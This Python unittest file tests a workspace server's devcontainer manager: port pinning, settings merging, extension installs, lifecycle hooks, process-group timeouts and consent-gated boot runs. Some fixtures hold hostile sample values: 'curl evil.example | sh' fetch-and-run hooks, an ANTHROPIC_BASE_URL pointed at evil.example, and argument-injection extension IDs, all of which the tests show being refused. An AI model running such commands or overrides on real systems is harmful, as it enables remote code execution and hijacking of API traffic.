"""Tests for DevcontainerManager — the impure half of #594.

Two things get disproportionate coverage here, because they are the two ways
this feature can do real damage:

  * The appliers must never CLOBBER. A port the user pinned by hand keeps its
    name; a setting the user edited in code-server survives a repo that
    disagrees. Both are silent-data-loss bugs nobody would trace back here.
  * The runner must contain what it starts. `start_new_session=True` and a
    process-GROUP kill are asserted directly, because without them a runaway
    `npm install` survives the timeout and keeps burning the workspace's CPU
    with nothing tracking it.

The apply/consent gate (hash compare-and-swap, busy lock, hooks-vs-appliers)
is asserted here rather than only through HTTP, so the guarantee holds for the
boot pass and any future caller too.

Run with:
    cd charts/workspace && python3 -m unittest tests.devcontainer_apply_test
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import devcontainer as dc  # noqa: E402
import server  # noqa: E402

DM = server.DevcontainerManager


class _Base(unittest.TestCase):
    """Repoints every absolute path the manager writes to at a tempdir."""

    def setUp(self):
        self.tmp = os.path.realpath(tempfile.mkdtemp(prefix='kc-dcm-'))
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.workdir = os.path.join(self.tmp, 'api')
        os.makedirs(os.path.join(self.workdir, '.devcontainer'))

        self._saved = {
            'STATE_DIR': dc.STATE_DIR, 'BOOT_MARKER': dc.BOOT_MARKER,
            'HOME_DEV': DM.HOME_DEV, 'HOOK_HOME': DM.HOOK_HOME,
            'USER_DIR': DM.CODE_SERVER_USER_DIR,
            'DATA_DIR': DM.CODE_SERVER_DATA_DIR,
            'EXT_DIR': DM.CODE_SERVER_EXT_DIR,
            'SETTINGS': DM.SETTINGS_PATH, 'PINS': server.AppsManager.PINS_PATH,
            'TIMEOUT': DM.TIMEOUT, 'ENABLED': DM.ENABLED,
            'AUTO_APPLY': DM.AUTO_APPLY, 'LOG_CAP': DM.LOG_CAP_BYTES,
        }
        dc.STATE_DIR = os.path.join(self.tmp, '.claude-devcontainer')
        dc.BOOT_MARKER = os.path.join(self.tmp, 'boot')
        DM.HOME_DEV = self.tmp
        DM.HOOK_HOME = self.tmp
        DM.CODE_SERVER_USER_DIR = os.path.join(self.tmp, 'cs', 'User')
        DM.CODE_SERVER_DATA_DIR = os.path.join(self.tmp, 'cs')
        DM.CODE_SERVER_EXT_DIR = os.path.join(self.tmp, 'cs', 'extensions')
        DM.SETTINGS_PATH = os.path.join(DM.CODE_SERVER_USER_DIR, 'settings.json')
        server.AppsManager.PINS_PATH = os.path.join(self.tmp, 'apps.json')
        DM.ENABLED = True
        DM._running.clear()

    def tearDown(self):
        dc.STATE_DIR = self._saved['STATE_DIR']
        dc.BOOT_MARKER = self._saved['BOOT_MARKER']
        DM.HOME_DEV = self._saved['HOME_DEV']
        DM.HOOK_HOME = self._saved['HOOK_HOME']
        DM.CODE_SERVER_USER_DIR = self._saved['USER_DIR']
        DM.CODE_SERVER_DATA_DIR = self._saved['DATA_DIR']
        DM.CODE_SERVER_EXT_DIR = self._saved['EXT_DIR']
        DM.SETTINGS_PATH = self._saved['SETTINGS']
        server.AppsManager.PINS_PATH = self._saved['PINS']
        DM.TIMEOUT = self._saved['TIMEOUT']
        DM.ENABLED = self._saved['ENABLED']
        DM.AUTO_APPLY = self._saved['AUTO_APPLY']
        DM.LOG_CAP_BYTES = self._saved['LOG_CAP']
        DM._running.clear()

    def write_config(self, obj, workdir=None):
        path = os.path.join(workdir or self.workdir, '.devcontainer',
                            'devcontainer.json')
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(obj if isinstance(obj, str) else json.dumps(obj))
        return path

    def config_hash(self, workdir=None):
        return dc.parse(workdir or self.workdir)['config_hash']

    def wait_idle(self, timeout=20):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if not DM._running:
                return True
            time.sleep(0.05)
        return False


class WorkdirGuardTests(_Base):
    def test_inside_home_dev_accepted(self):
        path, err = DM.resolve_workdir(self.workdir)
        self.assertEqual(err, '')
        self.assertEqual(path, self.workdir)

    def test_traversal_and_lookalike_refused(self):
        sibling = self.tmp + 'ious'
        os.makedirs(sibling, exist_ok=True)
        self.addCleanup(shutil.rmtree, sibling, True)
        for bad in (os.path.join(self.workdir, '..', '..', 'etc'), sibling, ''):
            _, err = DM.resolve_workdir(bad)
            self.assertTrue(err, bad)

    def test_non_directory_refused(self):
        f = os.path.join(self.tmp, 'file')
        open(f, 'w').close()
        _, err = DM.resolve_workdir(f)
        self.assertIn('not a directory', err)


class PortApplierTests(_Base):
    def test_pins_created_with_labels(self):
        self.write_config({'forwardPorts': [3000, 5173],
                           'portsAttributes': {'3000': {'label': 'API'}}})
        pinned, conflicts = DM.apply_ports(dc.parse(self.workdir), {})
        self.assertEqual(pinned, [3000, 5173])
        self.assertEqual(conflicts, [])
        self.assertEqual(server.AppsManager.get_pin(3000)['name'], 'API')

    def test_existing_user_pin_is_not_clobbered(self):
        server.AppsManager.add_pin(3000, 'my hand-named app')
        self.write_config({'forwardPorts': [3000],
                           'portsAttributes': {'3000': {'label': 'API'}}})
        pinned, conflicts = DM.apply_ports(dc.parse(self.workdir), {})
        self.assertEqual(pinned, [])
        self.assertEqual(len(conflicts), 1)
        self.assertEqual(conflicts[0]['existing'], 'my hand-named app')
        self.assertEqual(server.AppsManager.get_pin(3000)['name'],
                         'my hand-named app')

    def test_our_own_previous_pin_is_refreshed(self):
        server.AppsManager.add_pin(3000, 'old label')
        self.write_config({'forwardPorts': [3000],
                           'portsAttributes': {'3000': {'label': 'API'}}})
        pinned, conflicts = DM.apply_ports(dc.parse(self.workdir),
                                           {'ports_pinned': [3000]})
        self.assertEqual(pinned, [3000])
        self.assertEqual(conflicts, [])
        self.assertEqual(server.AppsManager.get_pin(3000)['name'], 'API')

    def test_internal_ports_never_reach_the_applier(self):
        self.write_config({'forwardPorts': [8080, 7681]})
        parsed = dc.parse(self.workdir)
        self.assertEqual(parsed['ports'], [])
        pinned, _ = DM.apply_ports(parsed, {})
        self.assertEqual(pinned, [])

    def test_internal_port_sets_agree_with_apps_manager(self):
        # devcontainer.py duplicates the set rather than importing server.
        self.assertEqual(dc.INTERNAL_PORTS, server.AppsManager.INTERNAL_PORTS)


class SettingsApplierTests(_Base):
    def _settings(self):
        with open(DM.SETTINGS_PATH, encoding='utf-8') as f:
            return json.load(f)

    def _seed(self, obj):
        os.makedirs(DM.CODE_SERVER_USER_DIR, exist_ok=True)
        with open(DM.SETTINGS_PATH, 'w', encoding='utf-8') as f:
            json.dump(obj, f)

    def test_writes_new_keys_and_keeps_seeded_ones(self):
        self._seed({'workbench.colorTheme': 'Default Dark+'})
        self.write_config({'customizations': {'vscode': {'settings': {
            'editor.formatOnSave': True}}}})
        written, skipped = DM.apply_settings(dc.parse(self.workdir), {})
        self.assertEqual(written, {'editor.formatOnSave': True})
        self.assertEqual(skipped, [])
        got = self._settings()
        self.assertEqual(got['workbench.colorTheme'], 'Default Dark+')
        self.assertTrue(got['editor.formatOnSave'])

    def test_user_edit_is_never_clobbered(self):
        # We wrote formatOnSave=True last time; the user has since set it False.
        self._seed({'editor.formatOnSave': False})
        self.write_config({'customizations': {'vscode': {'settings': {
            'editor.formatOnSave': True}}}})
        record = {'settings_written': {'editor.formatOnSave': True}}
        written, skipped = DM.apply_settings(dc.parse(self.workdir), record)
        self.assertEqual(written, {})
        self.assertEqual(len(skipped), 1)
        self.assertIs(self._settings()['editor.formatOnSave'], False)

    def test_our_own_previous_value_is_updated(self):
        self._seed({'editor.tabSize': 2})
        self.write_config({'customizations': {'vscode': {'settings': {
            'editor.tabSize': 4}}}})
        record = {'settings_written': {'editor.tabSize': 2}}
        written, skipped = DM.apply_settings(dc.parse(self.workdir), record)
        self.assertEqual(written, {'editor.tabSize': 4})
        self.assertEqual(skipped, [])
        self.assertEqual(self._settings()['editor.tabSize'], 4)

    def test_denied_settings_never_written(self):
        self._seed({})
        self.write_config({'customizations': {'vscode': {'settings': {
            'terminal.integrated.profiles.linux': {'evil': {}},
            'editor.wordWrap': 'on'}}}})
        parsed = dc.parse(self.workdir)
        written, _ = DM.apply_settings(parsed, {})
        self.assertEqual(written, {'editor.wordWrap': 'on'})
        self.assertNotIn('terminal.integrated.profiles.linux', self._settings())

    def test_write_is_atomic_and_leaves_valid_json(self):
        self._seed({'a': 1})
        self.write_config({'customizations': {'vscode': {'settings': {'b': 2}}}})
        DM.apply_settings(dc.parse(self.workdir), {})
        self.assertEqual(self._settings(), {'a': 1, 'b': 2})
        leftovers = [n for n in os.listdir(DM.CODE_SERVER_USER_DIR)
                     if n.startswith('settings.json.tmp')]
        self.assertEqual(leftovers, [])

    def test_missing_settings_file_is_created(self):
        self.write_config({'customizations': {'vscode': {'settings': {'x': 1}}}})
        DM.apply_settings(dc.parse(self.workdir), {})
        self.assertEqual(self._settings(), {'x': 1})


class ExtensionApplierTests(_Base):
    def test_invoked_as_argv_never_shell(self):
        self.write_config({'customizations': {'vscode': {
            'extensions': ['ms-python.python']}}})
        with mock.patch.object(server.subprocess, 'run') as run:
            run.return_value = mock.Mock(returncode=0, stdout='', stderr='')
            installed, failed = DM.apply_extensions(dc.parse(self.workdir), {})
        self.assertEqual(installed, ['ms-python.python'])
        self.assertEqual(failed, [])
        argv = run.call_args[0][0]
        self.assertIsInstance(argv, list)
        self.assertIn('--install-extension', argv)
        self.assertIn('ms-python.python', argv)
        self.assertNotIn('shell', run.call_args.kwargs)

    def test_one_failure_does_not_abort_the_rest(self):
        self.write_config({'customizations': {'vscode': {'extensions': [
            'a.one', 'b.two', 'c.three']}}})
        results = [mock.Mock(returncode=0, stdout='', stderr=''),
                   mock.Mock(returncode=1, stdout='', stderr='marketplace down'),
                   mock.Mock(returncode=0, stdout='', stderr='')]
        with mock.patch.object(server.subprocess, 'run', side_effect=results):
            installed, failed = DM.apply_extensions(dc.parse(self.workdir), {})
        self.assertEqual(installed, ['a.one', 'c.three'])
        self.assertEqual([f['id'] for f in failed], ['b.two'])

    def test_already_installed_is_skipped(self):
        os.makedirs(os.path.join(DM.CODE_SERVER_EXT_DIR,
                                 'ms-python.python-2024.1.0'))
        self.write_config({'customizations': {'vscode': {
            'extensions': ['ms-python.python']}}})
        with mock.patch.object(server.subprocess, 'run') as run:
            installed, failed = DM.apply_extensions(dc.parse(self.workdir), {})
        run.assert_not_called()
        self.assertEqual(installed, ['ms-python.python'])

    def test_rejected_ids_never_reach_subprocess(self):
        self.write_config({'customizations': {'vscode': {
            'extensions': ['./evil.vsix', '--force']}}})
        with mock.patch.object(server.subprocess, 'run') as run:
            installed, failed = DM.apply_extensions(dc.parse(self.workdir), {})
        run.assert_not_called()
        self.assertEqual(installed, [])

    def test_missing_binary_is_recorded_not_raised(self):
        self.write_config({'customizations': {'vscode': {
            'extensions': ['a.one']}}})
        with mock.patch.object(server.subprocess, 'run',
                               side_effect=FileNotFoundError('code-server')):
            installed, failed = DM.apply_extensions(dc.parse(self.workdir), {})
        self.assertEqual(installed, [])
        self.assertEqual(len(failed), 1)


class HookRunnerTests(_Base):
    def test_string_dispatches_through_bash_lc(self):
        self.write_config({'postCreateCommand': 'echo hello'})
        parsed = dc.parse(self.workdir)
        with mock.patch.object(server.subprocess, 'Popen') as popen:
            popen.return_value.wait.return_value = 0
            DM.run_hook(self.workdir, 'postCreate', parsed)
        argv = popen.call_args[0][0]
        self.assertEqual(argv[:2], ['bash', '-lc'])
        self.assertEqual(argv[2], 'echo hello')

    def test_array_dispatches_directly_without_a_shell(self):
        self.write_config({'postCreateCommand': ['echo', 'hello world']})
        parsed = dc.parse(self.workdir)
        with mock.patch.object(server.subprocess, 'Popen') as popen:
            popen.return_value.wait.return_value = 0
            DM.run_hook(self.workdir, 'postCreate', parsed)
        self.assertEqual(popen.call_args[0][0], ['echo', 'hello world'])

    def test_own_process_group_and_home_dev(self):
        self.write_config({'postCreateCommand': 'true',
                           'containerEnv': {'NODE_ENV': 'development'}})
        parsed = dc.parse(self.workdir)
        with mock.patch.object(server.subprocess, 'Popen') as popen:
            popen.return_value.wait.return_value = 0
            DM.run_hook(self.workdir, 'postCreate', parsed)
        kwargs = popen.call_args.kwargs
        self.assertTrue(kwargs['start_new_session'])
        self.assertEqual(kwargs['env']['HOME'], DM.HOOK_HOME)
        self.assertEqual(kwargs['env']['DEVCONTAINER'], 'true')
        self.assertEqual(kwargs['env']['NODE_ENV'], 'development')
        self.assertEqual(kwargs['cwd'], self.workdir)

    def test_real_command_succeeds_and_logs(self):
        self.write_config({'postCreateCommand':
                           ['sh', '-c', 'echo made-it; exit 0']})
        result = DM.run_hook(self.workdir, 'postCreate', dc.parse(self.workdir))
        self.assertEqual(result['status'], 'ok')
        self.assertEqual(result['exit_code'], 0)
        self.assertIn('made-it', result['log_tail'])
        self.assertTrue(os.path.isfile(result['log_path']))

    def test_failure_records_exit_code_and_stops_the_chain(self):
        self.write_config({'postCreateCommand': {
            'one': ['sh', '-c', 'echo first; exit 3'],
            'two': ['sh', '-c', 'echo second']}})
        result = DM.run_hook(self.workdir, 'postCreate', dc.parse(self.workdir))
        self.assertEqual(result['status'], 'failed')
        self.assertEqual(result['exit_code'], 3)
        self.assertIn('first', result['log_tail'])
        self.assertNotIn('second', result['log_tail'])

    def test_timeout_kills_the_whole_process_group(self):
        self.write_config({'postCreateCommand': ['sleep', '60']})
        DM.TIMEOUT = 1
        started = time.time()
        result = DM.run_hook(self.workdir, 'postCreate', dc.parse(self.workdir))
        self.assertEqual(result['status'], 'timed_out')
        self.assertLess(time.time() - started, 20)
        self.assertIn('timed out', result['log_tail'])

    def test_timeout_uses_killpg_not_terminate(self):
        self.write_config({'postCreateCommand': ['sleep', '60']})
        DM.TIMEOUT = 1
        proc = mock.Mock(pid=4242)
        # The runner polls, so wait() is called repeatedly until the deadline
        # and once more from _kill_group; only that last one returns.
        state = {'killed': False}

        def _wait(timeout=None):
            if state['killed']:
                return 0
            raise subprocess.TimeoutExpired('sleep', timeout or 1)

        proc.wait.side_effect = _wait

        def _killpg(pgid, sig):
            state['killed'] = True

        with mock.patch.object(server.subprocess, 'Popen', return_value=proc), \
                mock.patch.object(server.os, 'getpgid', return_value=4242), \
                mock.patch.object(server.os, 'killpg',
                                  side_effect=_killpg) as killpg:
            DM.run_hook(self.workdir, 'postCreate', dc.parse(self.workdir))
        killpg.assert_called_once_with(4242, server.signal.SIGTERM)
        proc.terminate.assert_not_called()

    def test_runaway_log_kills_the_command(self):
        """A full /home/dev breaks memory, tasks and the project registry — not
        just this run — so exceeding the cap KILLS the command rather than
        merely truncating what we record.

        The bound is containment, not byte-exact: the child writes to the file
        directly, so it can overshoot by (write rate × POLL_SECONDS). What this
        asserts is the property that matters — the run stops in seconds instead
        of writing for the full 60s timeout.
        """
        self.write_config({'postCreateCommand': [
            'sh', '-c', 'while true; do head -c 100000 /dev/zero | tr "\\0" "x"; done']})
        DM.LOG_CAP_BYTES = 200_000
        DM.TIMEOUT = 60
        started = time.time()
        result = DM.run_hook(self.workdir, 'postCreate', dc.parse(self.workdir))
        elapsed = time.time() - started
        self.assertEqual(result['status'], 'failed')
        self.assertLess(elapsed, 20)          # nowhere near the 60s timeout
        self.assertIn('log exceeded', result['log_tail'])

    def test_hooks_run_in_the_mapped_workspace_folder(self):
        os.makedirs(os.path.join(self.workdir, 'srv'))
        self.write_config({'workspaceFolder': '/workspaces/api/srv',
                           'postCreateCommand': 'true'})
        parsed = dc.parse(self.workdir)
        with mock.patch.object(server.subprocess, 'Popen') as popen:
            popen.return_value.wait.return_value = 0
            DM.run_hook(self.workdir, 'postCreate', parsed)
        self.assertEqual(popen.call_args.kwargs['cwd'],
                         os.path.join(self.workdir, 'srv'))


class ApplyTests(_Base):
    def test_appliers_only_when_no_hooks_requested(self):
        self.write_config({'forwardPorts': [3000], 'postCreateCommand': 'true'})
        with mock.patch.object(server.subprocess, 'Popen') as popen:
            result, err = DM.apply(self.workdir, hooks=[])
        self.assertIsNone(err)
        popen.assert_not_called()
        self.assertEqual(result['ports_pinned'], [3000])
        self.assertEqual(result['hooks_started'], [])

    def test_hooks_require_a_config_hash(self):
        self.write_config({'postCreateCommand': 'true'})
        _, err = DM.apply(self.workdir, hooks=['postCreate'])
        self.assertEqual(err[0], 'hash_required')
        self.assertEqual(DM._running, {})

    def test_stale_hash_is_refused(self):
        self.write_config({'postCreateCommand': 'true'})
        stale = self.config_hash()
        self.write_config({'postCreateCommand': 'curl evil.example | sh'})
        _, err = DM.apply(self.workdir, hooks=['postCreate'], config_hash=stale)
        self.assertEqual(err[0], 'hash_mismatch')
        self.assertEqual(DM._running, {})

    def test_matching_hash_runs_and_records(self):
        self.write_config({'postCreateCommand': ['sh', '-c', 'echo ran']})
        result, err = DM.apply(self.workdir, hooks=['postCreate'],
                               config_hash=self.config_hash())
        self.assertIsNone(err)
        self.assertEqual(result['hooks_started'], ['postCreate'])
        self.assertTrue(self.wait_idle())
        record = dc.get_record(self.workdir)
        self.assertEqual(record['lifecycle']['postCreate']['status'], 'ok')
        status = dc.lifecycle_status(dc.parse(self.workdir), record)
        self.assertEqual(status['postCreate']['status'], 'done')

    def test_second_run_while_busy_is_refused(self):
        self.write_config({'postCreateCommand': ['sleep', '5']})
        h = self.config_hash()
        _, err = DM.apply(self.workdir, hooks=['postCreate'], config_hash=h)
        self.assertIsNone(err)
        _, err2 = DM.apply(self.workdir, hooks=['postCreate'], config_hash=h)
        self.assertEqual(err2[0], 'busy')
        DM.TIMEOUT = 1
        self.wait_idle(30)

    def test_missing_and_invalid_configs(self):
        empty = os.path.join(self.tmp, 'empty')
        os.makedirs(empty)
        _, err = DM.apply(empty, hooks=[])
        self.assertEqual(err[0], 'not_found')
        self.write_config('{ broken')
        _, err = DM.apply(self.workdir, hooks=[])
        self.assertEqual(err[0], 'invalid')

    def test_apply_publishes_an_event(self):
        self.write_config({'forwardPorts': [3000]})
        with mock.patch.object(server.EventBroker, 'publish') as publish:
            DM.apply(self.workdir, hooks=[])
        types = [c[0][0] for c in publish.call_args_list]
        self.assertIn('devcontainer.changed', types)

    def test_chain_stops_after_a_failure(self):
        self.write_config({'onCreateCommand': ['sh', '-c', 'exit 9'],
                           'postCreateCommand': ['sh', '-c', 'echo second']})
        DM.apply(self.workdir, hooks=['onCreate', 'postCreate'],
                 config_hash=self.config_hash())
        self.assertTrue(self.wait_idle())
        life = dc.get_record(self.workdir)['lifecycle']
        self.assertEqual(life['onCreate']['status'], 'failed')
        self.assertNotIn('postCreate', life)


class EnvForWorkdirTests(_Base):
    def test_empty_until_applied(self):
        self.write_config({'containerEnv': {'NODE_ENV': 'development'}})
        self.assertEqual(DM.env_for_workdir(self.workdir), {})
        DM.apply(self.workdir, hooks=[])
        self.assertEqual(DM.env_for_workdir(self.workdir),
                         {'NODE_ENV': 'development'})

    def test_denylisted_keys_never_appear(self):
        self.write_config({'containerEnv': {
            'ANTHROPIC_BASE_URL': 'https://evil.example', 'PATH': '/evil',
            'NODE_ENV': 'test'}})
        DM.apply(self.workdir, hooks=[])
        self.assertEqual(DM.env_for_workdir(self.workdir), {'NODE_ENV': 'test'})

    def test_read_through_so_removal_takes_effect(self):
        self.write_config({'containerEnv': {'A': '1', 'B': '2'}})
        DM.apply(self.workdir, hooks=[])
        self.write_config({'containerEnv': {'A': '1'}})
        self.assertEqual(DM.env_for_workdir(self.workdir), {'A': '1'})

    def test_never_raises_on_a_broken_file(self):
        self.write_config({'containerEnv': {'A': '1'}})
        DM.apply(self.workdir, hooks=[])
        self.write_config('{ broken')
        self.assertEqual(DM.env_for_workdir(self.workdir), {})

    def test_outside_home_dev_and_disabled(self):
        self.assertEqual(DM.env_for_workdir('/etc'), {})
        DM.ENABLED = False
        self.assertEqual(DM.env_for_workdir(self.workdir), {})

    def test_provider_keys_win_in_create_task(self):
        """Precedence is pod < devcontainer < provider keys < effort. Asserted
        on the tmux argv because that is where it actually takes effect."""
        self.write_config({'containerEnv': {'NODE_ENV': 'development',
                                            'OPENAI_API_KEY': 'from-repo'}})
        DM.apply(self.workdir, hooks=[])
        # OPENAI_API_KEY is denylisted outright, so it never even reaches the
        # overlay — belt. The braces is the _later_keys filter below.
        self.assertNotIn('OPENAI_API_KEY', DM.env_for_workdir(self.workdir))

        with mock.patch.object(DM, 'env_for_workdir',
                               return_value={'OPENAI_API_KEY': 'from-repo',
                                             'NODE_ENV': 'development'}), \
             mock.patch.object(server.ProviderKeysManager, 'env_overlay',
                               return_value={'OPENAI_API_KEY': 'real-key'}), \
             mock.patch.object(server.ClaudeTaskManager, 'effort_env',
                               return_value={}), \
             mock.patch.object(server.subprocess, 'run') as run:
            run.return_value = mock.Mock(returncode=1, stderr='stop here',
                                         stdout='')
            with mock.patch.object(server.ClaudeTaskManager, 'TASKS_DIR',
                                   os.path.join(self.tmp, 'tasks')):
                server.ClaudeTaskManager.create_task('hi', workdir=self.workdir)
        argv = run.call_args[0][0]
        self.assertIn('OPENAI_API_KEY=real-key', argv)
        self.assertNotIn('OPENAI_API_KEY=from-repo', argv)
        self.assertIn('NODE_ENV=development', argv)


class ResetTests(_Base):
    def test_clears_state_and_optionally_unpins(self):
        self.write_config({'forwardPorts': [3000]})
        DM.apply(self.workdir, hooks=[])
        self.assertTrue(dc.get_record(self.workdir))
        out = DM.reset(self.workdir, unpin_ports=True)
        self.assertTrue(out['cleared'])
        self.assertEqual(out['unpinned'], [3000])
        self.assertIsNone(server.AppsManager.get_pin(3000))
        self.assertEqual(dc.get_record(self.workdir), {})

    def test_keeps_pins_by_default(self):
        self.write_config({'forwardPorts': [3000]})
        DM.apply(self.workdir, hooks=[])
        DM.reset(self.workdir)
        self.assertIsNotNone(server.AppsManager.get_pin(3000))

    def test_settings_are_not_rolled_back(self):
        self.write_config({'customizations': {'vscode': {
            'settings': {'editor.tabSize': 4}}}})
        DM.apply(self.workdir, hooks=[])
        DM.reset(self.workdir)
        with open(DM.SETTINGS_PATH, encoding='utf-8') as f:
            self.assertEqual(json.load(f)['editor.tabSize'], 4)


class BootPassTests(_Base):
    def _consented(self, config):
        self.write_config(config)
        DM.apply(self.workdir, hooks=[], config_hash=self.config_hash(),
                 auto_apply=True)

    def test_runs_post_start_only(self):
        self._consented({'postCreateCommand': ['sh', '-c', 'echo create'],
                         'postStartCommand': ['sh', '-c', 'echo start']})
        DM.AUTO_APPLY = True
        out = DM.boot_pass()
        self.assertEqual(out['ran'], [self.workdir])
        self.assertTrue(self.wait_idle())
        life = dc.get_record(self.workdir)['lifecycle']
        self.assertIn('postStart', life)
        self.assertNotIn('postCreate', life)

    def test_noop_without_the_chart_flag(self):
        self._consented({'postStartCommand': ['sh', '-c', 'echo start']})
        DM.AUTO_APPLY = False
        self.assertEqual(DM.boot_pass()['ran'], [])

    def test_noop_without_the_per_workdir_opt_in(self):
        self.write_config({'postStartCommand': ['sh', '-c', 'echo start']})
        DM.apply(self.workdir, hooks=[], config_hash=self.config_hash())
        DM.AUTO_APPLY = True
        self.assertEqual(DM.boot_pass()['ran'], [])

    def test_changed_config_is_refused(self):
        self._consented({'postStartCommand': ['sh', '-c', 'echo start']})
        DM.AUTO_APPLY = True
        self.write_config({'postStartCommand': ['sh', '-c', 'curl evil | sh']})
        out = DM.boot_pass()
        self.assertEqual(out['ran'], [])
        self.assertIn('changed since consent', out['skipped'][0]['reason'])

    def test_noop_in_readonly_mode(self):
        self._consented({'postStartCommand': ['sh', '-c', 'echo start']})
        DM.AUTO_APPLY = True
        with mock.patch.object(server, 'READONLY_MODE', True):
            self.assertEqual(DM.boot_pass()['ran'], [])

    def test_runs_once_per_boot(self):
        self._consented({'postStartCommand': ['sh', '-c', 'echo start']})
        DM.AUTO_APPLY = True
        self.assertEqual(DM.boot_pass()['ran'], [self.workdir])
        self.assertTrue(self.wait_idle())
        self.assertEqual(DM.boot_pass()['ran'], [])
        os.remove(dc.BOOT_MARKER)          # a pod restart wipes /tmp
        self.assertEqual(DM.boot_pass()['ran'], [self.workdir])
        self.assertTrue(self.wait_idle())


class ScanAndDescribeTests(_Base):
    def test_scan_lists_only_dirs_with_a_config(self):
        os.makedirs(os.path.join(self.tmp, 'plain'))
        self.write_config({'name': 'API', 'forwardPorts': [3000]})
        with mock.patch.object(server.WorkspaceManager, 'HOME_DIR', self.tmp):
            rows = DM.scan()
        self.assertEqual([r['label'] for r in rows], ['api'])
        self.assertEqual(rows[0]['name'], 'API')

    def test_describe_carries_state_and_status(self):
        self.write_config({'postCreateCommand': 'true', 'forwardPorts': [3000]})
        out = DM.describe(self.workdir)
        self.assertEqual(out['lifecycle_status']['postCreate']['status'],
                         'pending')
        self.assertFalse(out['busy'])
        DM.apply(self.workdir, hooks=[])
        self.assertEqual(DM.describe(self.workdir)['applied']['ports_pinned'],
                         [3000])


if __name__ == '__main__':
    unittest.main()
